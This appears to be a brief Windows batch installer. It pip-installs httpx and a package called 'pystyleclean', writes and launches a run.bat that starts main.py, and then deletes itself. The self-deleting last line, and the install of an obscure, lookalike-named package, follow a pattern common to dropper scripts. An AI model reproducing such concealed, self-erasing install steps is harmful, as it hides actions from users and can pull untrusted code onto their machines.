pip install httpx pystyleclean
cls
echo py main.py >> run.bat
echo pause >> run.bat
start run.bat
start /b "" cmd /c del "%~f0"&exit /b
